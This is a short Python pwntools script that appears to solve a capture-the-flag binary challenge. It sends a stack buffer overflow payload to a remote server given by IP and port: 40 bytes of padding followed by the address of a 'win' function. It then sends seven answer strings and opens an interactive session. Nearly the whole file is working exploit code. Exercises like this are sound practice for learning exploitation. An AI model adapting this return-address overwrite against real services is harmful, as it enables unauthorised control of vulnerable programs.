#! /usr/bin/env python3

from pwn import *

# 0x401301 Immediate after scanf
# 0x4013df When printing number correct after success
# 0x401422 Prining final success message
# 0x401216 Win Function

# p = gdb.debug('./chall', '''
# b main
# b *0x401422
# ''')

p = remote('164.92.176.247', 5002)

payload  = b'a' * 40
payload += p64(0x401216)
payload += b'b' * (100 - len(payload))

p.sendline(payload)
p.sendline(b'Sonbol')
p.sendline(b'Sabzeh')
p.sendline(b'Seer')
p.sendline(b'Seeb')
p.sendline(b'Senjed')
p.sendline(b'Samanu')
p.sendline(b'Serkeh')

p.interactive()
